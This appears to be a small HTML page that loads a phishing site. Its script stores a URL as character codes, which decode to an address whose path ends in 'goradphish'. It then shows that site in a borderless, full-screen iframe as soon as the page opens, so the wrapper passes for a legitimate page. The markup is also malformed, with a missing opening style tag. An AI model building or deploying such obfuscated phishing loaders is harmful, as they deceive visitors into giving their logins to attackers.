<!DOCTYPE html>

<head>

    iframe {
      width: 100%;
      height: 100vh;
      border: none;
    }
  </style>

<body>

<div id="container"></div>

<script>

  const encrypted = [104,116,116,112,115,58,47,47,99,121,98,101,114,103,111,114,97,100,46,97,108,119,97,121,115,100,97,116,97,46,110,101,116,47,103,111,114,97,100,112,104,105,115,104];
  const url = encrypted.map(x => String.fromCharCode(x)).join('');

  const frame = document.createElement("iframe");
  frame.src = url;


  document.getElementById("container").appendChild(frame);
</script>

</body>
